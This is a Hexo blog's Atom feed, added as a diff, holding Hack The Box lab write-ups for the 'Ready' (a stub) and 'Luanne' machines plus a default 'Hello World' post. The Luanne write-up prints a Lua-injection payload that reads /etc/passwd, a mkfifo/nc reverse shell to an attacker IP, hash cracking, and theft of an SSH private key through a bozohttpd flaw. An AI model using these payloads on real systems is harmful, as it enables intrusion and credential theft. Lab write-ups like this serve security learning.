@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Volen&#39;s BloG</title>
+  
+  
+  <link href="https://volenbait.github.io/atom.xml" rel="self"/>
+  
+  <link href="https://volenbait.github.io/"/>
+  <updated>2020-12-14T17:06:32.419Z</updated>
+  <id>https://volenbait.github.io/</id>
+  
+  <author>
+    <name>VolenBait</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>HTB_Ready writeup</title>
+    <link href="https://volenbait.github.io/2020/12/14/HTB-Ready/"/>
+    <id>https://volenbait.github.io/2020/12/14/HTB-Ready/</id>
+    <published>2020-12-14T04:31:34.000Z</published>
+    <updated>2020-12-14T17:06:32.419Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="">Ready</a>:Medium-level BOX.<br>FIRST:enum<br>FOOTHOLD:get right cve(Like ‘laboratory’)<br>User:SSRF &amp; CRLF &amp; Redis<br>Root:</p><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p><a href="https://www.anquanke.com/vul/id/1178769">CVE-2018</a>、gitlab、SSRF、CRLF</p><h2 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sS -Pn -n -open --min-hostgroup 1024 --host-timeout 20 -T4 -v 10.10.10.220<br></code></pre></td></tr></table></figure><p>to be continued…</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;a href=&quot;&quot;&gt;Ready&lt;/a&gt;:Medium-level BOX.&lt;br&gt;FIRST:enum&lt;br&gt;FOOTHOLD:get right cve(Like ‘laboratory’)&lt;br&gt;User:SSRF &amp;amp; CRLF &amp;amp; Redis&lt;br&gt;</summary>
+      
+    
+    
+    
+    
+    <category term="HTB" scheme="https://volenbait.github.io/tags/HTB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>HTB_Luanne writeup</title>
+    <link href="https://volenbait.github.io/2020/12/03/HTB-Luanne/"/>
+    <id>https://volenbait.github.io/2020/12/03/HTB-Luanne/</id>
+    <published>2020-12-03T07:37:34.000Z</published>
+    <updated>2020-12-14T15:47:18.044Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://www.hackthebox.eu/home/machines/profile/302">Luanne</a>:Easy-level BOX.<br>FIRST:enum!!!<br>FOOTHOLD:like its name <a href="https://www.runoob.com/lua/lua-tutorial.html">lua</a>nne,so where is the parame?<br>User:Find the fool Server on that port↑!<br>Root:how to repair .enc?</p><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p><a href="https://www.anquanke.com/vul/id/1178769">CVE-2010-2320</a>、Enum、lua Bourne shell、default password Guess、CTF like</p><h2 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sS -Pn -n -open --min-hostgroup 1024 --host-timeout 20 -T4 -v 10.10.10.218<br>  nmap -sC -sV -p22,80,9001<br></code></pre></td></tr></table></figure><img src="../../../pictures/HTB-Luanne/nmap.png" width="800px"><h3 id="dirb-gobuster"><a href="#dirb-gobuster" class="headerlink" title="dirb/gobuster"></a>dirb/gobuster</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dirb/gobuster http://10.10.10.218/<br></code></pre></td></tr></table></figure><h2 id="Port"><a href="#Port" class="headerlink" title="Port"></a>Port</h2><h3 id="Port-9001"><a href="#Port-9001" class="headerlink" title="Port-9001"></a>Port-9001</h3><p>It hints us “default”,I test supervisor default username&amp;password:”user:123” and it works!<br>We know:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">weather.lua<br>r.michaels<br></code></pre></td></tr></table></figure><img src="../../../pictures/HTB-Luanne/supervisor-process.png" width="800px"><h3 id="Port-8000"><a href="#Port-8000" class="headerlink" title="Port-8000"></a>Port-8000</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dirb/gobuster http://10.10.10.218/weather<br></code></pre></td></tr></table></figure><p>As we know it works ‘.lua’,lets test <a href="https://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities">lua injection</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ http://10.10.10.218/weather/forecast?city=London%27)<span class="hljs-built_in">print</span>(<br></code></pre></td></tr></table></figure><img src="../../../pictures/HTB-Luanne/lua-fuzz.png" width="800px">Burp : "attempt to call a nil value",it works so let's further!<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ http://10.10.10.218/weather/forecast?city=London<span class="hljs-string">&#x27;)os.execute(&#x27;</span>cat /etc/passwd<span class="hljs-string">&#x27;)--</span><br><span class="hljs-string">$ http://10.10.10.218/weather/forecast?city=London%27)os.execute(%27rm+%2ftmp%2fvolen%3bmkfifo+%2ftmp%2fvolen%3bcat+%2ftmp%2fvolen|%2fbin%2fsh+-i+2%3E%261|nc+10.10.14.81+6666+%3E%2ftmp%2fvolen%3b%27)--</span><br></code></pre></td></tr></table></figure><img src="../../../pictures/HTB-Luanne/lua-shell.png" width="500px"><p>Thanks to @singleye about <a href="/">mkfifo</a>,now you get shell!</p><h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ls -al &amp;&amp; cat .htpasswd<br>$ john -w=/usr/share/wordlist/rockyou.txt <span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure><img src="../../../pictures/HTB-Luanne/webapi_password.png" width="500px"><p>now we can use it on port 80:”webapi_user:iamthebest”,but get nothing useful here,so we should get other things in the shell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl -u webapi_user:iamthebest -I http://127.0.0.1:3001<br></code></pre></td></tr></table></figure><img src="../../../pictures/HTB-Luanne/3001server.png" width="500px"><p>We notice that “Server:bozohttpd”,thanks to <a href="https://www.anquanke.com/vul/id/1178769">CVE-2010-2320</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl -u webapi_user:iamthebest http://127.0.0.2:3001/~r.michaels/id_rsa<br></code></pre></td></tr></table></figure><img src="../../../pictures/HTB-Luanne/id_rsa.png" width="500px"><p>I forgot add the ‘/.ssh’ path but get the right result!Lucky(Really?Too CTF!).</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh -i id_rsa r.michaels@10.10.10.218<br>$ cat user.txt<br></code></pre></td></tr></table></figure><img src="../../../pictures/HTB-Luanne/user.png" width="500px"><p>Now we get user.</p><h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>Enum is one of your best friend!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ls -al<br>$ <span class="hljs-built_in">cd</span> backups<br></code></pre></td></tr></table></figure><h3 id="netpgp"><a href="#netpgp" class="headerlink" title="netpgp"></a>netpgp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/backup.tar.gz<br></code></pre></td></tr></table></figure><p>Hurry Hurry Hurry up!I don’t know why it will be deleted in 1 min!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ tar -xf backup.tar.gz<br>$ <span class="hljs-built_in">cd</span> /devel-2020-09-16/www<br>$ john -w=/usr/share/worldlist/rockyou.txt root_passwd<br></code></pre></td></tr></table></figure><img src="../../../pictures/HTB-Luanne/root_password.png" width="500px"><p>Get:’littlebear’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">$ doas -u root &#x2F;bin&#x2F;sh<br>$ littlebear<br>$ cat root.txt<br></code></pre></td></tr></table></figure><img src="../../../pictures/HTB-Luanne/root.png" width="500px"><p>ROOT!</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/302&quot;&gt;Luanne&lt;/a&gt;:Easy-level BOX.&lt;br&gt;FIRST:enum!!!&lt;br&gt;FOOTHOLD:like its name &lt;a hr</summary>
+      
+    
+    
+    
+    
+    <category term="HTB" scheme="https://volenbait.github.io/tags/HTB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="https://volenbait.github.io/2020/11/24/hello-world/"/>
+    <id>https://volenbait.github.io/2020/11/24/hello-world/</id>
+    <published>2020-11-24T06:47:11.515Z</published>
+    <updated>2020-11-24T06:47:11.515Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+</feed>
